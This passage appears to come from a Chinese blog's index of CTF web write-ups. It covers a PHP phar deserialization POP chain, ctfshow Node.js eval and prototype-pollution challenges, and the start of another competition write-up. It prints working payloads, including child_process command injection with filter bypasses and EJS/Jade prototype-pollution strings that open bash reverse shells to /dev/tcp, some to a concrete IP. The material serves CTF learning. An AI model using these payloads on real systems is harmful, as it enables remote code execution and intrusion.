çœ‹äº†å¥½å¤šwp éƒ½æ²¡æœ‰æåŠ çº¯å±æ˜¯æˆ‘å¤ªèœäº† \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683726874036-46a75869-468b-4c9d-833c-8651d7963247.png)\n\n```\n$this->results[$file->name()][$func] = $file->$func();\n```\n\n$fileå…¶å®å°±æ˜¯æˆ‘ä»¬è¦å»æ„é€ çš„Fileå¯¹è±¡ $funcæ˜¯è¿”å›çš„closeå‡½æ•°å ä¸Šé¢çš„demoä¸­ä¹Ÿæåˆ°äº†\n\næ‰€ä»¥è¿™é‡Œå°±ç­‰ä»·ä¸º`File->close`æ˜¯è¿™æ ·è°ƒç”¨çš„\n\nå…¶ææ„å‡½æ•°å¯ä»¥å°†è¿”å›çš„ç»“æœè¿”å›\n\n```php\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">ä¸‹è½½</a> / <a href=\"#\" class=\"delete\">åˆ é™¤</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n```\n\nç¨å¾®å®¡è®¡ä¸€ä¸‹å…¶å®å°±æ˜¯æŠŠresultæ•°ç»„ç»“æœèµ‹å€¼ç»™`$table` ç„¶å`echo $table;`è¾“å‡º\n\næ˜ç™½äº†æ•´ä¸ªé“¾å­ åº”è¯¥æ€ä¹ˆæ„é€ å‘¢ é¢˜ç›®åªå®¹è®¸æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ ä¸åƒæˆ‘ä»¬å¹³å¸¸åšçš„popé“¾ å»èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡è®©å…¶ååºåˆ—åŒ–\n\n## Typo3 ååºåˆ—åŒ–æ¼æ´\n\nè¯¥æ¼æ´ç”±phar://è§¦å‘\n\nå¯ä»¥ç›´æ¥å»çœ‹å¤§ä½¬çš„æ€»ç»“ï¼š\n\nhttps://xz.aliyun.com/t/2715#toc-8\n\n[https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](https://kylingit.com/blog/ç”±phpggcç†è§£phpååºåˆ—åŒ–æ¼æ´/)\n\nè¯´è¯´æˆ‘è‡ªå·±çš„çœ‹æ³•\n\né¦–å…ˆæˆ‘ä»¬çš„pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ åˆ°å¯¹æ–¹æœåŠ¡å™¨ä¸Š å¹¶ä¸”æœ‰ç›¸åº”çš„é­”æœ¯æ–¹æ³•ä½œä¸ºè¸æ¿ è€Œä¸”`/ phar://` ä¸èƒ½è¢«è½¬ä¹‰\n\npharæ˜¯phpçš„å‹ç¼©æ–‡ä»¶å¹¶ä¸”ä¸ç»è¿‡è§£å‹å°±èƒ½ç›´æ¥è¢«phpè®¿é—®å¹¶ä¸”æ‰§è¡Œ\n\npharç»“æ„ç”±å››éƒ¨åˆ†ç»„æˆï¼š\n\n- stub phar æ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸º `xxx<?php xxx; __HALT_COMPILER();?>`ï¼›\n- manifest å‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥**åºåˆ—åŒ–**å­˜å‚¨ï¼›\n- contents å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›\n- signature ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼›\n\næ„é€ å›ºå®šå†…å®¹ä¸ºï¼š\n\n```php\n//pharç”Ÿæˆä»£ç \n@unlink(\"Z1d10t.phar\");\n$phar = new Phar(\"Z1d10t.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n$phar->setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering();\n```\n\næˆ‘ä»¬å°†æ„é€ çš„æ¶æ„popé“¾å¡å…¥`$phar->setMetadata();`ä¸­ ,å¹¶ä¸”å­˜å‚¨å½¢å¼ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²å½¢å¼å­˜å‚¨\n\né€šè¿‡winhexæŸ¥çœ‹ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816275551-e8b892a0-9df4-4fc8-ab6b-18c0b8d4175c.png)\n\nå½“æˆ‘ä»¬é€šè¿‡`phar://`å»è®¿é—®è¯¥æ–‡ä»¶æ—¶ æˆ‘ä»¬æ„é€ çš„æ¶æ„åºåˆ—åŒ–popé“¾å°±ä¼šè¢«ååºåˆ—åŒ– ä»è€Œæ‰§è¡Œæ¶æ„ä»£ç \n\næ˜ç™½äº†åŸç†ä¹‹å ç›´æ¥æ„é€ \n\n```php\n<?php\nclass User {\n    public $db;\n}\n\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n\n    public function __construct() {\n        $this->results = array();\n        $this->funcs = array();\n        $file = new File();\n        $this->files = array($file);\n}\n}\nclass File {\n    public $filename='/flag.txt';\n}\n$a = new User();\n$a->db=new FileList();\n//pharç”Ÿæˆä»£ç \n@unlink(\"Z1d10t.phar\");\n$phar = new Phar(\"Z1d10t.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n$phar->setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering();\n?>\n```\n\nç„¶åè¿™ä¸ªflagè·¯å¾„æ˜¯æ€ä¹ˆæ¨æµ‹å‡ºæ¥çš„ å…¶å®é¢˜ç›®ä¹Ÿæœ‰æš—å–» åœ¨download.php ä¸è¿‡å¦‚æœæˆ‘åšè¿™é“é¢˜ç›®è‚¯å®šä¼šå½“ä¸ªçå­\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816525788-9a226973-ff05-44f0-8c1a-3a8f69c96fe3.png)\n\nå°†æˆ‘ä»¬ç”Ÿæˆçš„`Z1d10t.phar`æ”¹ä¸º`Z1d10t.png`ä¸Šä¼ ä¸Šå»è¿™ä¸ªåç¼€åå¹¶ä¸ä¼šå› ä¸ºè¢«ä¿®æ”¹è€Œå½±å“ çŒœæµ‹å°±åƒé‚£ä¸ªyamlååºåˆ—åŒ–é¢˜ç›®ä¸€æ · æ˜¯é€šè¿‡äºŒè¿›åˆ¶æ–‡ä»¶è¯»å–çš„ æ‰€ä»¥åç¼€æ— æ‰€è°“\n\nç„¶åè¿™é‡Œè®¿é—®ä¹Ÿæœ‰ä¸ªå‘  æˆ‘ä»¬å¯ä»¥é€šè¿‡download.php ä¸‹è½½è®¿é—® æˆ–è€… delete.php åˆ é™¤è®¿é—®\n\nå¦‚æœæˆ‘ä»¬é€šè¿‡ä¸‹è½½é¡µé¢è®¿é—®æ˜¯ä¸è¡Œçš„ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816750074-5e4f2216-b78b-406e-b1db-6769b1619212.png)\n\ndownload.phpä¸­æœ‰è¿™ä¹ˆä¸€ä¸²ä»£ç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683816798255-1e9ab852-3d82-442f-a515-bde701d1239e.png)\n\nPHP ini_setç”¨æ¥è®¾ç½®php.iniçš„å€¼ï¼Œåœ¨å‡½æ•°æ‰§è¡Œçš„æ—¶å€™ç”Ÿæ•ˆï¼Œè„šæœ¬ç»“æŸåï¼Œè®¾ç½®å¤±æ•ˆã€‚æ— éœ€æ‰“å¼€php.iniæ–‡ä»¶ï¼Œå°±èƒ½ä¿®æ”¹é…ç½®ï¼Œå¯¹äºè™šæ‹Ÿç©ºé—´æ¥è¯´ï¼Œå¾ˆæ–¹ä¾¿ã€‚å‚è€ƒï¼šhttps://developer.aliyun.com/article/521394\n\nç»•è¿‡ `open_basedir`å¯ä»¥å‚è€ƒï¼šhttps://xz.aliyun.com/t/10070\n\nä¹Ÿå°±æ˜¯è¯´download.phpè®¿é—®æ–‡ä»¶åªè¢«é™å®šäº`:/etc:/tmp``getcwd()`ä¹Ÿå°±æ˜¯å½“å‰æ–‡ä»¶ ä¸‰ä¸ªè·¯å¾„ æ²¡æ³•å»è¯»æˆ‘ä»¬çš„æ–‡ä»¶\n\nè€Œdelete.phpæ²¡æœ‰è¢«é™å®š å¯ä»¥å»è¯»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683817203363-4f6eda6d-8d10-4e90-a406-88afe550599b.png)\n","tags":["ä»£ç å®¡è®¡","phar"],"categories":["buuctf"]},{"title":"ctfshow-nodejs","url":"/post/372ab69b.html","content":"\nnodejsåˆ·é¢˜\n\n<!--more-->\n\n# å‰è¨€\n\nå› ä¸ºæ‰“ä¸€æ¬¡æ¯”èµ›åšåˆ°äº†è¿™ä¸ªnodejsåŸå‹é“¾æ±¡æŸ“ï¼Œæ˜¯ä¸€ç‚¹å¤´ç»ªéƒ½æ²¡æœ‰ï¼Œå°±æ¥æ¶è¡¥ä¸€ä¸‹ï¼Œkeep onï¼\n\n# Web-334(å¤§å°å†™)\n\nä»£ç å®¡è®¡ \n\nç»™äº†è´¦å·å’Œå¯†ç  è´¦å·æ˜¯å¤§å†™çš„`CTFSHOW`ï¼Œä½†æ˜¯è¾“å…¥çš„è´¦å·ä¸èƒ½ä¸ºå¤§å†™ï¼Œæœ‰ä¸ªå°å†™è½¬å¤§å†™çš„æ“ä½œï¼Œè¾“å…¥`ctfshow`å³å¯\n\n```php\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n```\n\n# Web-335(eval)\n\neval()ç”¨æ³•å’Œphpå·®ä¸å¤š éƒ½æ˜¯å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œ\n\nè¿™é‡Œnodejsæ‰§è¡Œå‘½ä»¤ç±»ä¼¼äºpython è¦è°ƒåº“ æ¯”å¦‚ pythonå°±è¦è°ƒåŒ…å«ç›®å½•æ‰§è¡Œçš„åº“ï¼Œæ¯”å¦‚osï¼Œåœ¨nodejsé‡Œä¹Ÿæ˜¯ä¸€æ · ä¸è¿‡è¿™é‡Œéƒ½æ˜¯é€šè¿‡`require('æ¨¡å—')`æ¥è°ƒ(ä¸ä¸¥è°¨ ä½†æ˜¯å¯ä»¥è¿™ä¹ˆç†è§£)\n\npayload:`/?eval=require('child_process').execSync('ls')`\n\nå¯ä»¥å‚è€ƒnodejsä¸­æ–‡ç½‘https://nodejs.cn/api/child_process.html#child-process\n\nä½†æ˜¯å…¶ä»–å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¯”å¦‚`exec()`è¿”å›éƒ½æ˜¯`[object Object]`\n\nåœ¨è¿™é‡Œåªèƒ½ç”¨`execSync`\n\n# Web-336\n\n## è§£æ³•ä¸€ï¼š\n\nè®¾ç½®äº†waf\n\nè¯»å½“å‰æ–‡ä»¶è·¯å¾„\n\n```\n?eval=__filename\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554090247-ff1c2fc3-f003-4545-bf76-66639c40658b.png)\n\n```\n?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')\n```\n\nè¿™é‡Œfsæ¨¡å—è´Ÿè´£è¯»å†™æ–‡ä»¶\n\nè¯»å½“å‰æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683554186939-e3aed060-1725-4070-ac8c-9b1b5c3e42fa.png)\n\nè¿‡æ»¤äº†`exec load`\n\né€šè¿‡å­—ç¬¦æ‹¼æ¥ç»•è¿‡ï¼š`?eval=require('child_process')['exe'%2B'cSync']('ls')`\n\n`%2B`æ˜¯`+`çš„urlç¼–ç \n\n## è§£æ³•äºŒï¼š\n\nç”¨fsæ¨¡å—è¯»å½“å‰è·¯å¾„æ–‡ä»¶\n\n```\n?eval=require('fs').readdirSync('.')\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683555038903-2775ef86-cbc4-40d8-be79-40e3b7d08b79.png)\n\nç›´æ¥è¯»å°±è¡Œäº†\n\n```\n?eval=require('fs').readFileSync('fl001g.txt','utf-8')\n```\n\nè¿™é‡Œè¯»è·¯å¾„å’Œæ–‡ä»¶å‘½ä»¤ç¨æœ‰ä¸åŒ ä¸è¿‡å¾ˆå¥½è®°\n\n## è§£æ³•ä¸‰ï¼š\n\n```\n?eval=require(\"child_process\")[\"\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63\"]('cmd')\n```\n\nåˆ©ç”¨ç¼–ç ç»•è¿‡\n\n# Web-337(æ•°ç»„ç»•è¿‡)\n\nç»™äº†æºç  ç±»ä¼¼äºphpçš„md5æ€è·¯\n\n```\n?a[]=1&b[]=1\n```\n\nå¯ä»¥çœ‹å¸ˆå‚…çš„æ€»ç»“ tqlï¼šhttps://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/\n\nWeb-336çš„ç¼–ç ç»•è¿‡å°±æ˜¯çœ‹äº†è¿™ä¸ªå¸ˆå‚…çš„\n\n# Web-338(ç»å…¸åŸå‹é“¾æ±¡æŸ“)\n\nç»™äº†æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683557652246-a808a88e-6dd5-4b14-84f1-a84d4af958d8.png)\n\nå½“secertå¯¹è±¡çš„ctfshowå±æ€§ä¸ºé¢˜ç›®æ‰€éœ€å€¼å°±ç»™flag\n\né‚£ä¹ˆå°±é€šè¿‡åŸå‹é“¾æ±¡æŸ“Objectçš„ctfshowå±æ€§ ä»è€Œä½¿å¾—secertå¯¹è±¡ä¸ºæ‰€éœ€å€¼\n\nå¯åˆ©ç”¨ç‚¹ä¸ºè¿™ä¸ªcopyå‡½æ•° \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559440720-45034e2c-417e-47c8-a101-9e188bd902f2.png)\n\nè·Ÿè¸ªä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683559770866-5f796f05-3f52-4681-9481-efbeeb866d8d.png)\n\nå‘ç°äº†åŸå‹é“¾æ±¡æŸ“çš„ç»å…¸è¯­å¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683558958836-ddb03c4f-d761-4df2-8cc7-f9abcf68303e.png)\n\nå½“æ—¶åšè¿™é“é¢˜é¢˜ç›®æ—¶å€™æœ‰ä¸ªç–‘é—®å°±æ˜¯ä¸ºä»€ä¹ˆpostä¼ è¾“çš„æ•°æ®æ˜¯åœ¨å“ªé‡Œæ¥å—åˆ°çš„ï¼Œå› ä¸ºæ˜¯é›¶åŸºç¡€jsï¼Œè¿˜åœ¨æ…¢æ…¢æ‘¸ç´¢ï¼Œåˆå»å®¡äº†ä¸€æ¬¡ä»£ç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683598380991-64209db3-a460-4b75-afe7-df8776ea2216.png)\n\n```php\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  \n}\n```\n\næ•´ä¸ªè¯­å¥éƒ½æ˜¯`router{}`å›Šæ‹¬èµ·æ¥çš„,å¹¶ä¸”æ˜¯é€šè¿‡postä¼ å‚ï¼Œè€Œä¸”è¿˜åŠ è½½äº†`require('body-parser')`ä¸­é—´é”®ã€‚\n\nbody-parseræ˜¯éå¸¸å¸¸ç”¨çš„ä¸€ä¸ªexpressä¸­é—´ä»¶ï¼Œä½œç”¨æ˜¯å¯¹postè¯·æ±‚çš„è¯·æ±‚ä½“è¿›è¡Œè§£æ  ã€‚\n\né™¤æ­¤ä¹‹å¤–ä¸ºä»€ä¹ˆè¦ç”¨jsonæ ¼å¼ä¼ è¾“ï¼Œpç¥åšå®¢ä¸­ä¹ŸæåŠäº†ï¼Œå¦‚æœä¸ç”¨jsonæ–‡ä»¶å‘é€é‚£ä¹ˆ`__proto__`å°±ä¼šè¢«å½“ä½œåŸå‹æ‰§è¡Œï¼Œå¯¼è‡´æ±¡æŸ“å¤±è´¥ï¼Œåªæœ‰é€šè¿‡jsonæ ¼å¼æäº¤ï¼Œæ‰ä¼šè¢«å½“ä½œkeyæ¥æ‰§è¡Œï¼Œè¿™æ ·æ‰èƒ½è¾¾åˆ°åŸå‹é“¾æ±¡æŸ“çš„æ•ˆæœã€‚\n\nå…³äºnodejsè¯·æ±‚ å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« æ¯”è¾ƒç¬¦åˆæˆ‘è¿™ç§æ–°æ‰‹ï¼šhttps://www.cnblogs.com/Diamond-sjh/p/11324138.html\n\n# Web-339 (api)\n\nè¿™é“é¢˜ç›®å¤šäº†ä¸€ä¸ª/apiè·¯ç”± å¹¶ä¸”çœ‹åˆ°äº†render å¤šäº†ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637579498-c75155d1-168c-4366-9602-d3ef54456d8a.png)\n\nå‘ç°Function è¿™é‡Œå€Ÿç”¨pç¥çš„ç†è§£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683637631439-cf02616e-fcbb-443e-9873-bee89aeaab0d.png)\n\nè¿™é‡Œqueryæ²¡æœ‰è¢«å®šä¹‰ï¼Œå°±ä¼šåœ¨Objectå¯¹è±¡ä¸­å¯»æ‰¾è¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å‘ä¸Šæ±¡æŸ“Objectæ·»åŠ ä¸€ä¸ªqueryå±æ€§å°±è¡Œäº† ã€‚\n\nè¿™é‡Œæä¾›ä¸‰ç§payload:\n\npayload1:\n\n```\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/ip/port 0>&1\\\"');var __tmp2\"}}\n```\n\n`outputFunctionName`æ˜¯ejså¼•æ“çš„ä¸€ä¸ªå±æ€§ å¯ä»¥å‚è€ƒï¼šhttps://blog.csdn.net/DARKNOTES/article/details/124000520\n\npayload2:\n\n```\n{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/ip/port 0>&1\\\"')\"}}\n```\n\næ²¡æœ‰requireï¼Œæ‰€ä»¥å°±ç”¨ `global.process.mainModule.constructor._load`æ¥å¯¼å…¥ child_process\n\npayload3:\n\n```\n{\"__proto__\":{\"query\":\"var net = process.mainModule.constructor._load('net'),cp = process.mainModule.constructor._load('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(port,'ip', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;\"}}\n```\n\n Functionç¯å¢ƒä¸‹æ²¡æœ‰requireå‡½æ•°ï¼Œä¸èƒ½è·å¾—child_processæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨`process.mainModule.constructor._load`æ¥ä»£æ›¿requireã€‚  \n\nç„¶åflagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ ä¸€å¼€å§‹è¢«è¿™ä¸ªå‘åˆ°äº†\n\n# Web-340(äºŒæ¬¡æ±¡æŸ“)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683638759001-e1aa0968-7e8c-4aaf-958b-81ea9f963718.png)\n\nè¿™é‡Œuserä¸ºä¸€ä¸ªå¯¹è±¡ ä»–çš„å±æ€§userinfoä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ \n\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³é€šè¿‡copyå‡½æ•°é€šè¿‡`user.userinfo`æ±¡æŸ“åˆ°`Object.prototype`\n\nå³åˆ™`user.userinfo->user(ç¬¬ä¸€æ¬¡æ±¡æŸ“)->Object(ç¬¬äºŒæ¬¡æ±¡æŸ“)`éœ€è¦æ±¡æŸ“ä¸¤æ¬¡\n\nè·¯ç”±/apiçš„æ€è·¯å’Œä¸Šä¸€é¢˜ä¸€æ · åˆ™å¯ä»¥ç”¨ä¸Šé¢˜çš„payloadï¼ŒåµŒå¥—ä¸€ä¸ª__proto__å³å¯\n\n `{\"__proto__\":{\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 0>&1\\\"')\"}}}`\n\n\n\n# Web-341(ejsæ¨¡æ¿)\n\næ²¡äº†/apiè·¯ç”±\n\nä¹Ÿæ²¡æœ‰äº†æ¡ä»¶è¾“å‡ºflag\n\nçœ‹äº†wpæ˜¯ejsçš„æ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“rce\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683644860927-cc3a4cc9-9c22-403c-bc3c-c1af74831522.png)\n\né‚£ä¹ˆæ—¢ç„¶æ²¡æœ‰æ¡ä»¶Functionå‡½æ•°è®©æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿæ²¡æœ‰è¾“å‡ºflagï¼Œè¯¥æ€ä¹ˆå¼„å‘¢\n\næ•´ä½“åˆ†æå¯å‚è€ƒï¼šhttps://www.anquanke.com/post/id/236354#h2-2\n\nå¤§è‡´æ€è·¯ä¸ºï¼šé€šè¿‡åŸå‹é“¾æ±¡æŸ“ å»è¦†ç›–è¿™ä¸ªæ¨¡æ¿æ¸²æŸ“æ—¶çš„æ‹¼æ¥ä»£ç ï¼Œè®©å…¶æ‹¼æ¥è¿›ejsæ¨¡æ¿ä»£ç ç§ï¼Œä»è€Œæ¸²æŸ“æ—¶è¿›è¡ŒRCE\n\n```\npayload:{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 0>&1\\\"');var __tmp2\"}}}\n```\n\n# Web-342ã€343(jadeæ¨¡æ¿)\n\nå®¡è®¡æºç ï¼Œå‘ç°æ¢äº†æ¨¡æ¿å¼•æ“\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684596147-6e4fef35-4a8e-416b-a460-35b266724fe8.png)\n\næ€è·¯ä¸ä¸Šé¢ejsæ¨¡æ¿ç›¸åŒ ç›´æ¥çœ‹å¸ˆå‚…ä»¬çš„payloadå³å¯\n\n1. `{\"__proto__\":{\"__proto__\": {\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/124.221.177.###/7777 0>&1\\\"')\"}}}`\n2. `{\"__proto__\":{\"__proto__\":{\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.constructor._load('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/124.221.###.174/7777 0>&1\\\"')\"}}}`\n3. `{\"__proto__\":{\"__proto__\":{\"type\":\"Code\",\"self\":1,\"line\":\"global.process.mainModule.require('child_process').execSync('bash -c \\\" bash -i >&/dev/tcp/124.221.177.###/7777 0>&1\\\"')\"}}}`\n\næ³¨æ„è¿™é‡Œæœ‰ä¸¤ä¸ªå¤§å‘ å‘æ­»æˆ‘äº†\n\né¦–å…ˆæäº¤è¦post burpé»˜è®¤get\n\næœ€å‘çš„æ˜¯Content-Typeè¦æ”¹ä¸º `application/json`ç›å¾·å½“æ—¶è¿™é‡Œä¸€ç›´æ˜¯é»˜è®¤çš„ ä¸€ç›´æ²¡æ”¹ å¯¼è‡´ä¸€ç›´åå¼¹å¤±è´¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684527595-86a87036-1fd4-40cb-8708-94c204bd0d1c.png)\n\nç„¶åå†æ¥è¯´è¯´æ‰¾flagçš„æ–¹æ³• \n\nç›´æ¥`cat /proc/self/environ`å»æ‰¾\n\næˆ–è€…`env|grep ctfshow` å…¶å®å°±æ˜¯ç®¡é“ç¬¦æŠŠenvçš„è¾“å‡ºçš„å†…å®¹å½“ä½œgrep(æŸ¥æ‰¾å­—ç¬¦)çš„å‚æ•°\n\nå…¶å®æœ¬è´¨ä¸Šè¿™ä¸¤è€…æ˜¯ç­‰ä»·çš„ éƒ½æ˜¯åœ¨ç¯å¢ƒå˜é‡ç§å¯»æ‰¾flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683684961708-f7e1d476-7428-4704-a807-1a67cacfe7ba.png)\n\n# Web-344(nodejs è§£æç‰¹æ€§)\n\nç»™äº†æºç ï¼š\n\n```javascript\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig)){\n    res.end('where is flag :)');\n  }\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\n    res.end(flag);\n  }else{\n    res.end('where is flag. :)');\n  }\n\n});\n```\n\næ ¹æ®æºç æˆ‘ä»¬åº”è¯¥ä¼ \n\n```\n?query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":\"true)\"}\n```\n\n`req.url.match(/8c|2c|\\,/ig)`ä½†æ˜¯æ­£åˆ™è¿‡æ»¤äº†ç©ºå­—ç¬¦ é€—å·ä»¥åŠå…¶urlç¼–ç  \n\n çœ‹äº†å¤§ä½¬çš„wp åº”è¯¥è¿™æ ·ä¼ `?query={\"name\":\"admin\"&query=\"password\":\"ctfshow\"&query=\"isVIP\":true}` urlç¼–ç ä¹‹åä¼ ä¸Šå»\n\n nodejsä¸­ä¼šæŠŠè¿™ä¸‰éƒ¨åˆ†æ‹¼æ¥èµ·æ¥ \n\nè¢«ä¼ å…¥ä¹‹åreq.queryè¢«è§£ææˆäº†ä¸€ä¸ªæ•°ç»„ï¼Œä¹‹ååœ¨JSON.parseçš„è§£æä¸‹å˜æˆäº†å¯¹è±¡ï¼Œå°±å˜æˆäº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœäº†ã€‚\n","tags":["nodejsåŸå‹é“¾æ±¡æŸ“","nodejs"],"categories":["ctfshow"]},{"title":"è´µé˜³å¤§æ•°æ®åŠç½‘ç»œå®‰å…¨ç²¾è‹±å¯¹æŠ—èµ›WEBéƒ¨åˆ†WP","url":"/post/232bb69.html","content":"\nè´µé˜³å¤§æ•°æ®åŠç½‘ç»œå®‰å…¨ç²¾è‹±å¯¹æŠ—èµ›WEBéƒ¨åˆ†WP\n\n<!--more-->\n\n# ä»”ç»†ping\n\næœ‰ç‚¹çœ‹ä¸æ‡‚çš„ä¸€é“é¢˜ç›®ï¼Œipå»pingï¼Œè¿”å›å’Œæˆ‘ä»¬æœ¬åœ°pingç½‘ç«™å·®ä¸å¤šçš„å›æ˜¾ï¼Œåˆšå¼€å§‹æ˜¯ä»¥ä¸ºç”¨é€»è¾‘ç¬¦`|&&`ä¹‹ç±»çš„é¢˜ç›®æ¥åšï¼Œåæ¥å‘ç°æƒ³å¤æ‚äº†ï¼Œä»–é¢˜ç›®æ„æ€å¥½åƒåªèƒ½ç”¨ä»–æŒ‡å®šçš„å‘½ä»¤ï¼Œé™¤æ­¤ä¹‹å¤–å…¶ä»–å­—ç¬¦ä¸€å¾‹å±è”½\n\næ¯”å¦‚ `?ip=ls`å°±å¯ä»¥åˆæ³•ï¼Œä½†æ˜¯å¦‚æœ`?ip=l`ä¸€ä¸ªå­—ç¬¦ä¹Ÿä¼šè¢«å±è”½ï¼Œè›®ntçš„è¯´å®è¯ã€‚\n\npayload:`?id=ls`\n\nå‘ç°æœ¬åœ°æœ‰flag.php\n\nç›´æ¥ `?id=nl flag.php`\n\n# pop\n\n```php\n<?php\n  highlight_file(__FILE__);\nclass TT{\n  public $key;\n  public $c;\n  public function __destruct(){\n    echo $this->key;\n  }\n  \n  public function __toString(){\n    return \"welcome\";\n  }\n}\n\nclass JJ{\n  public $obj;\n  public function __toString(){\n    ($this -> obj)();\n    return \"1\";\n  }\n  public function evil($c){\n    eval($c);\n  }\n  public function __sleep(){\n    phpinfo();\n  }\n}\n\nclass MM{\n  public $name;\n  public $c;\n  public function __invoke(){\n    ($this->name)($this->c);\n  }\n  public function __toString(){\n 